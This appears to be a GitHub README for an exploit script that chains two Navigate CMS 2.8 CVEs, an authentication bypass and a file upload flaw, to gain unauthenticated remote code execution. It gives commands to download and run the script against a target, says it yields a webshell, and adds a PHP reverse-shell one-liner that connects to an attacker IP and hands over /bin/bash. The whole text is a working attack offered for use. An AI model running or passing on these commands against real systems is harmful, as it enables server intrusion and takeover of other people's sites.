# Navigate-CMS-RCE -Unauthenticated-
This module exploits insufficient sanitization in the database::protect method, of Navigate CMS versions 2.8

This script exploits:
- CVE 2018-17552  # Authentication bypass
- CVE 2018-17553  # File upload


## Use Mode
<pre><code>wget https://raw.githubusercontent.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-/main/navigate_RCE.sh

./navigate_RCE.sh navigator.hm</code></pre>

![image](https://user-images.githubusercontent.com/6622069/206307543-97cff429-f41c-471d-9e76-85620708ec84.png)

Getting a simple webshell. Enjoy!

## Tip: Upgrade to ReverseShell
<pre><code>php -r '$sock=fsockopen("192.168.153.133",9000);system("/bin/bash <&3 >&3 2>&3");' </code></pre>

![image](https://user-images.githubusercontent.com/6622069/206309051-e423ad7c-b473-4463-ad82-a1d8606e31ac.png)
